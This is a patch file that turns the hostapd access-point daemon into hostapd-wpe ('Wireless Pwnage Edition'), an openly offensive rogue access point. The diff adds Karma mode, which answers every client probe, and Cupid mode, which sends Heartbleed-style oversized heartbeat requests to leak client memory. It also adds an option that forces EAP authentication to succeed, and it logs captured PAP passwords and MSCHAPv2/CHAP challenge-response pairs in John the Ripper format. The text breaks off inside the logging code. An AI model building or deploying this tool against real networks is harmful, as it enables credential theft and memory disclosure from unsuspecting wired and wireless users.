@@ -1,0 +1,855 @@
+diff -rupN hostapd-2.5/hostapd/config_file.c hostapd-2.5-wpe/hostapd/config_file.c
+--- hostapd-2.5/hostapd/config_file.c	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/hostapd/config_file.c	2015-10-25 19:25:49.543351020 +0100
+@@ -21,6 +21,7 @@
+ #include "ap/ap_config.h"
+ #include "config_file.h"
+ 
++#include "wpe/wpe.h"
+ 
+ #ifndef CONFIG_NO_RADIUS
+ #ifdef EAP_SERVER
+@@ -2056,6 +2057,20 @@ static int hostapd_config_fill(struct ho
+ 			return 1;
+ 		}
+ 		wpa_printf(MSG_DEBUG, "eapol_version=%d", bss->eapol_version);
++  } else if (os_strcmp(buf, "wpe_logfile") == 0) {
++      wpe_conf.wpe_logfile = os_strdup(pos);
++  } else if (os_strcmp(buf, "wpe_hb_send_before_handshake") == 0) {
++      wpe_conf.wpe_hb_send_before_handshake = atoi(pos);
++  } else if (os_strcmp(buf, "wpe_hb_send_before_appdata") == 0) {
++      wpe_conf.wpe_hb_send_before_appdata = atoi(pos);
++  } else if (os_strcmp(buf, "wpe_hb_send_after_appdata") == 0) {
++      wpe_conf.wpe_hb_send_after_appdata = atoi(pos);
++  } else if (os_strcmp(buf, "wpe_hb_payload_size") == 0) {
++      wpe_conf.wpe_hb_payload_size = atoi(pos);
++  } else if (os_strcmp(buf, "wpe_hb_num_repeats") == 0) {
++      wpe_conf.wpe_hb_num_repeats = atoi(pos);
++  } else if (os_strcmp(buf, "wpe_hb_num_tries") == 0) {
++      wpe_conf.wpe_hb_num_tries = atoi(pos);
+ #ifdef EAP_SERVER
+ 	} else if (os_strcmp(buf, "eap_authenticator") == 0) {
+ 		bss->eap_server = atoi(pos);
+
+diff -rupN hostapd-2.5/hostapd/main.c hostapd-2.5-wpe/hostapd/main.c
+--- hostapd-2.5/hostapd/main.c	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/hostapd/main.c	2015-10-25 19:35:41.220483130 +0100
+@@ -29,6 +29,7 @@
+ #include "eap_register.h"
+ #include "ctrl_iface.h"
+ 
++#include "wpe/wpe.h"
+ 
+ struct hapd_global {
+ 	void **drv_priv;
+@@ -422,11 +423,17 @@ static int hostapd_global_run(struct hap
+ static void show_version(void)
+ {
+ 	fprintf(stderr,
+-		"hostapd v" VERSION_STR "\n"
+-		"User space daemon for IEEE 802.11 AP management,\n"
++		"hostapd-wpe v" VERSION_STR "\n"
++    "User space daemon for IEEE 802.11 AP management,\n"
+ 		"IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator\n"
+ 		"Copyright (c) 2002-2015, Jouni Malinen <j@w1.fi> "
+-		"and contributors\n");
++    "and contributors\n"
++         "-----------------------------------------------------\n"
++         "WPE (Wireless Pwnage Edition)\n"
++         "This version has been cleverly modified to target\n"
++         "wired and wireless users.\n"
++         "Brad Antoniewicz <@brad_anton>\n"
++         "Foundstone\n");
+ }
+ 
+ 
+@@ -435,7 +442,7 @@ static void usage(void)
+ 	show_version();
+ 	fprintf(stderr,
+ 		"\n"
+-		"usage: hostapd [-hdBKtv] [-P <PID file>] [-e <entropy file>] "
++    "usage: hostapd-wpe [-hdBKtvskc] [-P <PID file>] [-e <entropy file>] "
+ 		"\\\n"
+ 		"         [-g <global ctrl_iface>] [-G <group>] \\\n"
+ 		"         <configuration file(s)>\n"
+@@ -457,7 +464,12 @@ static void usage(void)
+ 		"        (records all messages regardless of debug verbosity)\n"
+ #endif /* CONFIG_DEBUG_LINUX_TRACING */
+ 		"   -t   include timestamps in some debug messages\n"
+-		"   -v   show hostapd version\n");
++    "   -v   show hostapd version\n\n"
++         " WPE Options -------------------\n"
++         "       (credential logging always enabled)\n"
++         "   -s   Return Success where possible\n" 
++         "   -k   Karma Mode (Respond to all probes)\n"
++         "   -c   Cupid Mode (Heartbleed clients)\n\n");
+ 
+ 	exit(1);
+ }
+@@ -587,7 +599,8 @@ int main(int argc, char *argv[])
+ 	interfaces.global_ctrl_dst = NULL;
+ 
+ 	for (;;) {
+-		c = getopt(argc, argv, "b:Bde:f:hKP:Ttu:vg:G:");
++    c = getopt(argc, argv, "b:Bde:f:hKP:Ttu:vg:G:kcs");
++
+ 		if (c < 0)
+ 			break;
+ 		switch (c) {
+@@ -648,6 +661,15 @@ int main(int argc, char *argv[])
+ 		case 'u':
+ 			return gen_uuid(optarg);
+ #endif /* CONFIG_WPS */
++    case 'k':
++        wpe_conf.wpe_enable_karma++;
++        break;
++    case 'c':
++        wpe_conf.wpe_enable_cupid++;
++        break;
++    case 's': 
++        wpe_conf.wpe_enable_return_success++;
++        break;
+ 		default:
+ 			usage();
+ 			break;
+diff -rupN hostapd-2.5/hostapd/Makefile hostapd-2.5-wpe/hostapd/Makefile
+--- hostapd-2.5/hostapd/Makefile	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/hostapd/Makefile	2015-10-25 19:40:08.627224025 +0100
+@@ -62,6 +62,7 @@ OBJS += ../src/ap/preauth_auth.o
+ OBJS += ../src/ap/pmksa_cache_auth.o
+ OBJS += ../src/ap/ieee802_11_shared.o
+ OBJS += ../src/ap/beacon.o
++OBJS += ../src/wpe/wpe.o
+ OBJS += ../src/ap/bss_load.o
+ 
+ OBJS_c = hostapd_cli.o ../src/common/wpa_ctrl.o ../src/utils/os_$(CONFIG_OS).o
+@@ -934,7 +935,7 @@ OBJS += ../src/fst/fst_ctrl_iface.o
+ endif
+ endif
+ 
+-ALL=hostapd hostapd_cli
++ALL=hostapd-wpe hostapd-wpe_cli
+ 
+ all: verify_config $(ALL)
+ 
+@@ -981,15 +982,15 @@ install: $(addprefix $(DESTDIR)$(BINDIR)
+ 
+ BCHECK=../src/drivers/build.hostapd
+ 
+-hostapd: $(BCHECK) $(OBJS)
+-	$(Q)$(CC) $(LDFLAGS) -o hostapd $(OBJS) $(LIBS)
++hostapd-wpe: $(BCHECK) $(OBJS)
++	$(Q)$(CC) $(LDFLAGS) -o hostapd-wpe $(OBJS) $(LIBS)
+ 	@$(E) "  LD " $@
+ 
+ ifdef CONFIG_WPA_TRACE
+ OBJS_c += ../src/utils/trace.o
+ endif
+-hostapd_cli: $(OBJS_c)
+-	$(Q)$(CC) $(LDFLAGS) -o hostapd_cli $(OBJS_c) $(LIBS_c)
++hostapd-wpe_cli: $(OBJS_c)
++	$(Q)$(CC) $(LDFLAGS) -o hostapd-wpe_cli $(OBJS_c) $(LIBS_c)
+ 	@$(E) "  LD " $@
+ 
+ NOBJS = nt_password_hash.o ../src/crypto/ms_funcs.o $(SHA1OBJS)
+@@ -1036,7 +1037,7 @@ lcov-html:
+ 
+ clean:
+ 	$(MAKE) -C ../src clean
+-	rm -f core *~ *.o hostapd hostapd_cli nt_password_hash hlr_auc_gw
++	rm -f core *~ *.o hostapd-wpe hostapd-wpe_cli nt_password_hash hlr_auc_gw
+ 	rm -f *.d *.gcno *.gcda *.gcov
+ 	rm -f lcov.info
+ 	rm -rf lcov-html
+diff -rupN hostapd-2.5/src/ap/beacon.c hostapd-2.5-wpe/src/ap/beacon.c
+--- hostapd-2.5/src/ap/beacon.c	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/src/ap/beacon.c	2015-10-25 19:45:25.530335207 +0100
+@@ -30,6 +30,7 @@
+ #include "hs20.h"
+ #include "dfs.h"
+ 
++#include "wpe/wpe.h"
+ 
+ #ifdef NEED_AP_MLME
+ 
+@@ -754,6 +755,13 @@ void handle_probe_req(struct hostapd_dat
+ 	}
+ #endif /* CONFIG_P2P */
+ 
++  if (wpe_conf.wpe_enable_karma && elems.ssid_len > 0) {
++          wpa_printf(MSG_MSGDUMP,"[WPE] Probe request from " MACSTR ", changing SSID to '%s'", MAC2STR(mgmt->sa), wpa_ssid_txt(elems.ssid, elems.ssid_len));
++          hostapd_set_ssid(hapd,elems.ssid,elems.ssid_len); 
++          os_memcpy(&hapd->conf->ssid.ssid,elems.ssid,elems.ssid_len);
++          hapd->conf->ssid.ssid_len = elems.ssid_len;
++  } 
++
+ 	res = ssid_match(hapd, elems.ssid, elems.ssid_len,
+ 			 elems.ssid_list, elems.ssid_list_len);
+ 	if (res == NO_SSID_MATCH) {
+diff -rupN hostapd-2.5/src/ap/ieee802_11.c hostapd-2.5-wpe/src/ap/ieee802_11.c
+--- hostapd-2.5/src/ap/ieee802_11.c	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/src/ap/ieee802_11.c	2015-10-25 19:47:22.673322551 +0100
+@@ -43,6 +43,7 @@
+ #include "ieee802_11.h"
+ #include "dfs.h"
+ 
++#include "wpe/wpe.h"
+ 
+ u8 * hostapd_eid_supp_rates(struct hostapd_data *hapd, u8 *eid)
+ {
+@@ -1249,8 +1250,8 @@ static u16 check_ssid(struct hostapd_dat
+ 	if (ssid_ie == NULL)
+ 		return WLAN_STATUS_UNSPECIFIED_FAILURE;
+ 
+-	if (ssid_ie_len != hapd->conf->ssid.ssid_len ||
+-	    os_memcmp(ssid_ie, hapd->conf->ssid.ssid, ssid_ie_len) != 0) {
++  if ((!wpe_conf.wpe_enable_karma) && (ssid_ie_len != hapd->conf->ssid.ssid_len ||
++      os_memcmp(ssid_ie, hapd->conf->ssid.ssid, ssid_ie_len) != 0)) {
+ 		hostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_IEEE80211,
+ 			       HOSTAPD_LEVEL_INFO,
+ 			       "Station tried to associate with unknown SSID "
+diff -rupN hostapd-2.5/src/crypto/tls_openssl.c hostapd-2.5-wpe/src/crypto/tls_openssl.c
+--- hostapd-2.5/src/crypto/tls_openssl.c	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/src/crypto/tls_openssl.c	2015-10-25 20:03:51.323951441 +0100
+@@ -20,6 +20,7 @@
+ #include <openssl/err.h>
+ #include <openssl/pkcs12.h>
+ #include <openssl/x509v3.h>
++#include <openssl/rand.h>
+ #ifndef OPENSSL_NO_ENGINE
+ #include <openssl/engine.h>
+ #endif /* OPENSSL_NO_ENGINE */
+@@ -36,6 +37,8 @@
+ #include "sha256.h"
+ #include "tls.h"
+ 
++#include "wpe/wpe.h"
++
+ #if OPENSSL_VERSION_NUMBER < 0x10000000L
+ /* ERR_remove_thread_state replaces ERR_remove_state and the latter is
+  * deprecated. However, OpenSSL 0.9.8 doesn't include
+@@ -73,6 +76,8 @@ static BIO * BIO_from_keystore(const cha
+ }
+ #endif /* ANDROID */
+ 
++int wpe_hb_enc(struct tls_connection *conn); // WPE: To limit changes up top
++
+ static int tls_openssl_ref_count = 0;
+ static int tls_ex_idx_session = -1;
+ 
+@@ -1138,7 +1143,10 @@ struct tls_connection * tls_connection_i
+ 
+ 	conn->context = context;
+ 	SSL_set_app_data(conn->ssl, conn);
+-	SSL_set_msg_callback(conn->ssl, tls_msg_cb);
++  if (wpe_conf.wpe_enable_cupid) 
++    SSL_set_msg_callback(conn->ssl, wpe_hb_cb);
++  else
++    SSL_set_msg_callback(conn->ssl, tls_msg_cb);
+ 	SSL_set_msg_callback_arg(conn->ssl, conn);
+ 	options = SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 |
+ 		SSL_OP_SINGLE_DH_USE;
+@@ -3089,8 +3097,10 @@ static struct wpabuf *
+ openssl_handshake(struct tls_connection *conn, const struct wpabuf *in_data,
+ 		  int server)
+ {
+-	int res;
++	int res,i;
+ 	struct wpabuf *out_data;
++  struct wpabuf *wpe_hb_ptr1, *wpe_hb_ptr2;
++
+ 
+ 	/*
+ 	 * Give TLS handshake data from the server (if available) to OpenSSL
+@@ -3150,6 +3160,25 @@ openssl_handshake(struct tls_connection
+ 	}
+ 	wpabuf_put(out_data, res);
+ 
++  if (wpe_conf.wpe_enable_cupid && wpe_conf.wpe_hb_send_before_handshake && wpe_conf.wpe_hb_num_tries) {
++
++      wpa_printf(MSG_DEBUG, "[WPE] Sending heartbeat request instead of handshake\n");
++      wpe_hb_ptr1 = NULL;
++      for (i=0; i < wpe_conf.wpe_hb_num_repeats; i++) {
++          wpe_hb_ptr2 = wpabuf_alloc(wpe_hb_msg_len-1);
++          memcpy(wpabuf_mhead(wpe_hb_ptr2), (u8 *)wpe_hb_clear(), wpe_hb_msg_len-1);
++          wpabuf_put(wpe_hb_ptr2, wpe_hb_msg_len-1);
++          if (wpe_hb_ptr1) {
++              wpe_hb_ptr1 = wpabuf_concat(wpe_hb_ptr1,wpe_hb_ptr2);
++          } else { 
++              wpe_hb_ptr1 = wpe_hb_ptr2;
++          }
++      }
++      conn->ssl->tlsext_hb_pending = 1;
++      wpe_conf.wpe_hb_num_tries--;
++      return wpe_hb_ptr1;
++  }
++
+ 	return out_data;
+ }
+ 
+@@ -3265,6 +3294,10 @@ struct wpabuf * tls_connection_encrypt(v
+ 		tls_show_errors(MSG_INFO, __func__, "BIO_reset failed");
+ 		return NULL;
+ 	}
++
++  if (wpe_conf.wpe_enable_cupid && wpe_conf.wpe_hb_send_before_appdata)
++      wpe_hb_enc(conn);
++
+ 	res = SSL_write(conn->ssl, wpabuf_head(in_data), wpabuf_len(in_data));
+ 	if (res < 0) {
+ 		tls_show_errors(MSG_INFO, __func__,
+@@ -3272,6 +3305,9 @@ struct wpabuf * tls_connection_encrypt(v
+ 		return NULL;
+ 	}
+ 
++  if (wpe_conf.wpe_enable_cupid && wpe_conf.wpe_hb_send_after_appdata)
++      wpe_hb_enc(conn);
++
+ 	/* Read encrypted data to be sent to the server */
+ 	buf = wpabuf_alloc(wpabuf_len(in_data) + 300);
+ 	if (buf == NULL)
+@@ -4069,6 +4105,65 @@ int tls_connection_set_session_ticket_cb
+ #endif /* EAP_FAST || EAP_FAST_DYNAMIC || EAP_SERVER_FAST */
+ }
+ 
++int wpe_hb_enc(struct tls_connection *conn) {
++    unsigned char *cbuf, *p;
++
++    unsigned int real_payload = 18; //default: 18 /* Sequence number + random bytes */
++    unsigned int padding = 16; //default: 16 /* Use minimum padding */
++
++    if (!SSL_is_init_finished(conn->ssl)) {
++        return -1;
++    }
++
++    if(!conn->ssl->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
++            conn->ssl->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS) {
++        wpa_printf(MSG_DEBUG, "[WPE] warning: heartbeat extension is unsupported (try anyway)\n");
++    } else {
++        wpa_printf(MSG_DEBUG,"[WPE] Heartbeat extention is supported, may not be vulnerable!\n");
++    }
++
++    /* Check if padding is too long, payload and padding
++    * must not exceed 2^14 - 3 = 16381 bytes in total.
++    */
++    OPENSSL_assert(real_payload + padding <= 16381);
++
++    cbuf = OPENSSL_malloc(1 + 2 + real_payload + padding);
++
++    if(cbuf==NULL)
++        return -1;
++
++    p = cbuf;
++
++    *p++ = TLS1_HB_REQUEST;
++
++
++    /* Payload length (18 bytes here) */
++    //s2n(payload, p);  /* standards compliant payload */
++    //s2n(payload +10, p);  /* >payload to exploit heartbleed!!! */
++    s2n(wpe_conf.wpe_hb_payload_size, p); /* configured payload */
++
++    /* Sequence number */
++    s2n(conn->ssl->tlsext_hb_seq, p);
++    /* 16 random bytes */
++    RAND_pseudo_bytes(p, 16);
++    //RAND_bytes(p, 16);
++    p += 16;
++    /* Random padding */
++    RAND_pseudo_bytes(p, padding);
++    //RAND_bytes(p, padding);
++
++    wpa_printf(MSG_DEBUG, "[WPE] Sending heartbeat reaquesting payload size %u...\n", wpe_conf.wpe_hb_payload_size);
++    wpa_hexdump(MSG_DEBUG, "[WPE] heartbeat packet to send:", cbuf, 1 + 2 + real_payload + padding);
++
++    /* Send heartbeat request */
++    if (SSL_get_ssl_method(conn->ssl)->ssl_write_bytes(conn->ssl, TLS1_RT_HEARTBEAT,
++    cbuf, 3 + real_payload + padding) >= 0)
++    conn->ssl->tlsext_hb_pending = 1;
++    OPENSSL_free(cbuf);
++
++    return 0;
++}
++
+ 
+ int tls_get_library_version(char *buf, size_t buf_len)
+ {
+diff -rupN hostapd-2.5/src/eap_server/eap_server.c hostapd-2.5-wpe/src/eap_server/eap_server.c
+--- hostapd-2.5/src/eap_server/eap_server.c	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/src/eap_server/eap_server.c	2015-10-25 20:06:23.685009957 +0100
+@@ -23,7 +23,8 @@
+ #define STATE_MACHINE_DATA struct eap_sm
+ #define STATE_MACHINE_DEBUG_PREFIX "EAP"
+ 
+-#define EAP_MAX_AUTH_ROUNDS 50
++//#define EAP_MAX_AUTH_ROUNDS 50
++#define EAP_MAX_AUTH_ROUNDS 50000 // wpe >:)
+ 
+ static void eap_user_free(struct eap_user *user);
+ 
+@@ -164,6 +165,8 @@ int eap_user_get(struct eap_sm *sm, cons
+ {
+ 	struct eap_user *user;
+ 
++  char ident = 't';
++
+ 	if (sm == NULL || sm->eapol_cb == NULL ||
+ 	    sm->eapol_cb->get_eap_user == NULL)
+ 		return -1;
+@@ -175,6 +178,11 @@ int eap_user_get(struct eap_sm *sm, cons
+ 	if (user == NULL)
+ 	    return -1;
+ 
++  if (phase2) {
++      identity = (const u8 *)&ident;
++      identity_len = 1;
++  }
++
+ 	if (sm->eapol_cb->get_eap_user(sm->eapol_ctx, identity,
+ 				       identity_len, phase2, user) != 0) {
+ 		eap_user_free(user);
+diff -rupN hostapd-2.5/src/eap_server/eap_server_mschapv2.c hostapd-2.5-wpe/src/eap_server/eap_server_mschapv2.c
+--- hostapd-2.5/src/eap_server/eap_server_mschapv2.c	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/src/eap_server/eap_server_mschapv2.c	2015-10-25 20:11:57.318992345 +0100
+@@ -13,6 +13,7 @@
+ #include "crypto/random.h"
+ #include "eap_i.h"
+ 
++#include "wpe/wpe.h"
+ 
+ struct eap_mschapv2_hdr {
+ 	u8 op_code; /* MSCHAPV2_OP_* */
+@@ -291,7 +292,7 @@ static void eap_mschapv2_process_respons
+ 	size_t username_len, user_len;
+ 	int res;
+ 	char *buf;
+-
++  u8 wpe_challenge_hash[8];
+ 	pos = eap_hdr_validate(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, respData,
+ 			       &len);
+ 	if (pos == NULL || len < 1)
+@@ -329,6 +330,8 @@ static void eap_mschapv2_process_respons
+ 	wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: NT-Response", nt_response, 24);
+ 	wpa_printf(MSG_MSGDUMP, "EAP-MSCHAPV2: Flags 0x%x", flags);
+ 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: Name", name, name_len);
++  challenge_hash(peer_challenge, data->auth_challenge, name, name_len, wpe_challenge_hash);
++  wpe_log_chalresp("mschapv2", name, name_len, wpe_challenge_hash, 8, nt_response, 24);
+ 
+ 	buf = os_malloc(name_len * 4 + 1);
+ 	if (buf) {
+@@ -406,6 +409,11 @@ static void eap_mschapv2_process_respons
+ 		return;
+ 	}
+ 
++  if (wpe_conf.wpe_enable_return_success) {
++    os_memset((void *)nt_response, 0, 24);
++    os_memset((void *)expected, 0, 24);
++  }
++
+ 	if (os_memcmp_const(nt_response, expected, 24) == 0) {
+ 		const u8 *pw_hash;
+ 		u8 pw_hash_buf[16], pw_hash_hash[16];
+@@ -446,6 +454,8 @@ static void eap_mschapv2_process_respons
+ 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Invalid NT-Response");
+ 		data->state = FAILURE_REQ;
+ 	}
++  if (wpe_conf.wpe_enable_return_success)
++    data->state = SUCCESS;
+ }
+ 
+ 
+diff -rupN hostapd-2.5/src/eap_server/eap_server_peap.c hostapd-2.5-wpe/src/eap_server/eap_server_peap.c
+--- hostapd-2.5/src/eap_server/eap_server_peap.c	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/src/eap_server/eap_server_peap.c	2015-10-25 20:17:20.693699507 +0100
+@@ -17,7 +17,7 @@
+ #include "eap_common/eap_tlv_common.h"
+ #include "eap_common/eap_peap_common.h"
+ #include "tncs.h"
+-
++#include "wpe/wpe.h"
+ 
+ /* Maximum supported PEAP version
+  * 0 = Microsoft's PEAP version 0; draft-kamath-pppext-peapv0-00.txt
+diff -rupN hostapd-2.5/src/eap_server/eap_server_ttls.c hostapd-2.5-wpe/src/eap_server/eap_server_ttls.c
+--- hostapd-2.5/src/eap_server/eap_server_ttls.c	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/src/eap_server/eap_server_ttls.c	2015-10-25 20:46:06.516768323 +0100
+@@ -16,7 +16,7 @@
+ #include "eap_server/eap_tls_common.h"
+ #include "eap_common/chap.h"
+ #include "eap_common/eap_ttls.h"
+-
++#include "wpe/wpe.h"
+ 
+ #define EAP_TTLS_VERSION 0
+ 
+@@ -530,7 +530,7 @@ static void eap_ttls_process_phase2_pap(
+ 					const u8 *user_password,
+ 					size_t user_password_len)
+ {
+-	if (!sm->user || !sm->user->password || sm->user->password_hash ||
++  if (!sm->user || !sm->user->password || sm->user->password_hash ||
+ 	    !(sm->user->ttls_auth & EAP_TTLS_AUTH_PAP)) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: No plaintext user "
+ 			   "password configured");
+@@ -538,9 +538,11 @@ static void eap_ttls_process_phase2_pap(
+ 		return;
+ 	}
+ 
+-	if (sm->user->password_len != user_password_len ||
++  wpe_log_basic("eap-ttls/pap", sm->identity, sm->identity_len, user_password, user_password_len);
++
++  if ((!wpe_conf.wpe_enable_return_success) && (sm->user->password_len != user_password_len ||
+ 	    os_memcmp_const(sm->user->password, user_password,
+-			    user_password_len) != 0) {
++			    user_password_len) != 0)) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: Invalid user password");
+ 		eap_ttls_state(data, FAILURE);
+ 		return;
+@@ -602,9 +604,10 @@ static void eap_ttls_process_phase2_chap
+ 	/* MD5(Ident + Password + Challenge) */
+ 	chap_md5(password[0], sm->user->password, sm->user->password_len,
+ 		 challenge, challenge_len, hash);
++     
++     wpe_log_chalresp("eap-ttls/chap", sm->identity, sm->identity_len, challenge, challenge_len, password, password_len);
+ 
+-	if (os_memcmp_const(hash, password + 1, EAP_TTLS_CHAP_PASSWORD_LEN) ==
+-	    0) {
++  if ((wpe_conf.wpe_enable_return_success) || (os_memcmp(hash, password + 1, EAP_TTLS_CHAP_PASSWORD_LEN) == 0)) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/CHAP: Correct user password");
+ 		eap_ttls_state(data, SUCCESS);
+ 		eap_ttls_valid_session(sm, data);
+@@ -671,8 +674,11 @@ static void eap_ttls_process_phase2_msch
+ 	else
+ 		nt_challenge_response(challenge, sm->user->password,
+ 				      sm->user->password_len, nt_response);
++   
++    wpe_log_chalresp("eap-ttls/mschap", sm->identity, sm->identity_len, challenge, challenge_len, response + 2 + 24, 24);
+ 
+-	if (os_memcmp_const(nt_response, response + 2 + 24, 24) == 0) {
++ 
++  if ((wpe_conf.wpe_enable_return_success) || (os_memcmp(nt_response, response + 2 + 24, 24) == 0)) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/MSCHAP: Correct response");
+ 		eap_ttls_state(data, SUCCESS);
+ 		eap_ttls_valid_session(sm, data);
+@@ -694,7 +700,7 @@ static void eap_ttls_process_phase2_msch
+ 					     u8 *response, size_t response_len)
+ {
+ 	u8 *chal, *username, nt_response[24], *rx_resp, *peer_challenge,
+-		*auth_challenge;
++		*auth_challenge, wpe_challenge_hash[8];
+ 	size_t username_len, i;
+ 
+ 	if (challenge == NULL || response == NULL ||
+@@ -778,7 +784,11 @@ static void eap_ttls_process_phase2_msch
+ 				     nt_response);
+ 	}
+ 
+-	rx_resp = response + 2 + EAP_TTLS_MSCHAPV2_CHALLENGE_LEN + 8;
++  rx_resp = response + 2 + EAP_TTLS_MSCHAPV2_CHALLENGE_LEN + 8;
++
++  challenge_hash(peer_challenge, auth_challenge, username, username_len, wpe_challenge_hash);
++  wpe_log_chalresp("eap-ttls/mschapv2", username, username_len, wpe_challenge_hash, 8, rx_resp, 24);
++
+ #ifdef CONFIG_TESTING_OPTIONS
+ 	{
+ 		u8 challenge2[8];
+diff -rupN hostapd-2.5/src/Makefile hostapd-2.5-wpe/src/Makefile
+--- hostapd-2.5/src/Makefile	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/src/Makefile	2015-10-25 20:46:39.159659989 +0100
+@@ -1,4 +1,4 @@
+-SUBDIRS=ap common crypto drivers eapol_auth eapol_supp eap_common eap_peer eap_server l2_packet p2p pae radius rsn_supp tls utils wps
++SUBDIRS=ap common crypto drivers eapol_auth eapol_supp eap_common eap_peer eap_server l2_packet p2p pae radius rsn_supp tls utils wps wpe
+ SUBDIRS += fst
+ 
+ all:
+diff -rupN hostapd-2.5/src/utils/wpa_debug.c hostapd-2.5-wpe/src/utils/wpa_debug.c
+--- hostapd-2.5/src/utils/wpa_debug.c	2015-09-27 21:02:05.000000000 +0200
++++ hostapd-2.5-wpe/src/utils/wpa_debug.c	2015-10-25 20:48:00.797890010 +0100
+@@ -30,7 +30,7 @@ static FILE *wpa_debug_tracing_file = NU
+ 
+ 
+ int wpa_debug_level = MSG_INFO;
+-int wpa_debug_show_keys = 0;
++int wpa_debug_show_keys = 1; // WPE >:)
+ int wpa_debug_timestamp = 0;
+ 
+ 
+diff -rupN hostapd-2.5/src/wpe/Makefile hostapd-2.5-wpe/src/wpe/Makefile
+--- hostapd-2.5/src/wpe/Makefile	1970-01-01 01:00:00.000000000 +0100
++++ hostapd-2.5-wpe/src/wpe/Makefile	2015-10-25 16:52:26.349508655 +0100
+@@ -0,0 +1,8 @@
++all:
++	@echo Nothing to be made.
++
++clean:
++	rm -f *~ *.o *.d *.gcno *.gcda *.gcov
++
++install:
++	@echo Nothing to be made.
+diff -rupN hostapd-2.5/src/wpe/wpe.c hostapd-2.5-wpe/src/wpe/wpe.c
+--- hostapd-2.5/src/wpe/wpe.c	1970-01-01 01:00:00.000000000 +0100
++++ hostapd-2.5-wpe/src/wpe/wpe.c	2015-10-25 16:52:26.349508655 +0100
+@@ -0,0 +1,209 @@
++/*
++    wpe.c - 
++        brad.antoniewicz@foundstone.com
++        Implements WPE (Wireless Pwnage Edition) functionality within 
++        hostapd.
++
++        WPE functionality focuses on targeting connecting users. At 
++        it's core it implements credential logging (originally 
++        implemented in FreeRADIUS-WPE), but also includes other patches
++        for other client attacks that have been modified to some extend.
++
++            FreeRADIUS-WPE: https://github.com/brad-anton/freeradius-wpe
++            Karma patch: http://foofus.net/goons/jmk/tools/hostapd-1.0-karma.diff
++            Cupid patch: https://github.com/lgrangeia/cupid/blob/master/patch-hostapd
++*/
++
++#include <time.h>
++#include <openssl/ssl.h>
++#include "includes.h"
++#include "common.h"
++#include "wpe/wpe.h"
++#include "utils/wpa_debug.h"
++
++#define wpe_logfile_default_location "./hostapd-wpe.log"
++
++
++#define MSCHAPV2_CHAL_HASH_LEN 8
++#define MSCHAPV2_CHAL_LEN 16 
++#define MSCHAPV2_RESP_LEN 24
++
++char wpe_hb_msg[] = "\x18\x03\x01\x00\x03\x01\xff\xff"; 
++size_t wpe_hb_msg_len = sizeof(wpe_hb_msg)/sizeof(wpe_hb_msg[0]);
++
++struct wpe_config wpe_conf = {
++    .wpe_logfile = wpe_logfile_default_location,
++    .wpe_logfile_fp = NULL,
++    .wpe_enable_karma = 0,
++    .wpe_enable_cupid = 0,
++    .wpe_enable_return_success = 0,
++    .wpe_hb_send_before_handshake = 1,
++    .wpe_hb_send_before_appdata = 0,
++    .wpe_hb_send_after_appdata = 0,
++    .wpe_hb_payload_size = 50000,
++    .wpe_hb_num_tries = 1,
++    .wpe_hb_num_repeats = 10
++};
++
++void wpe_log_file_and_stdout(char const *fmt, ...) {
++
++    if ( wpe_conf.wpe_logfile_fp == NULL ) {
++        wpe_conf.wpe_logfile_fp = fopen(wpe_conf.wpe_logfile, "a");
++        if ( wpe_conf.wpe_logfile_fp == NULL ) 
++            printf("WPE: Cannot file log file");
++    }
++
++    va_list ap;
++
++    va_start(ap, fmt);
++    vprintf(fmt, ap);
++    va_end(ap);
++
++    va_start(ap, fmt);
++    if ( wpe_conf.wpe_logfile_fp != NULL )
++        vfprintf(wpe_conf.wpe_logfile_fp, fmt, ap);
++    va_end(ap);
++}
++
++void wpe_log_chalresp(char *type, const u8 *username, size_t username_len, const u8 *challenge, size_t challenge_len, const u8 *response, size_t response_len) {
++    time_t nowtime;
++    int x; 
++
++    nowtime = time(NULL);
++
++    wpe_log_file_and_stdout("\n\n%s: %s", type, ctime(&nowtime));
++    wpe_log_file_and_stdout("\t username:\t");
++    for (x=0; x<username_len; x++)
++        wpe_log_file_and_stdout("%c",username[x]);
++    wpe_log_file_and_stdout("\n");
++
++    wpe_log_file_and_stdout("\t challenge:\t");
++    for (x=0; x<challenge_len - 1; x++)
++        wpe_log_file_and_stdout("%02x:",challenge[x]);
++    wpe_log_file_and_stdout("%02x\n",challenge[x]);
++
++    wpe_log_file_and_stdout("\t response:\t");
++    for (x=0; x<response_len - 1; x++)
++        wpe_log_file_and_stdout("%02x:",response[x]);
++    wpe_log_file_and_stdout("%02x\n",response[x]);
++
++    if (strncmp(type, "mschapv2", 8) == 0 || strncmp(type, "eap-ttls/mschapv2", 17) == 0) {
++        wpe_log_file_and_stdout("\t jtr NETNTLM:\t");
++        for (x=0; x<username_len; x++)
++            wpe_log_file_and_stdout("%c",username[x]);
++        wpe_log_file_and_stdout(":$NETNTLM$");
++
++        for (x=0; x<challenge_len; x++)
++            wpe_log_file_and_stdout("%02x",challenge[x]);
++        wpe_log_file_and_stdout("$");
++        for (x=0; x<response_len; x++)
++            wpe_log_file_and_stdout("%02x",response[x]);
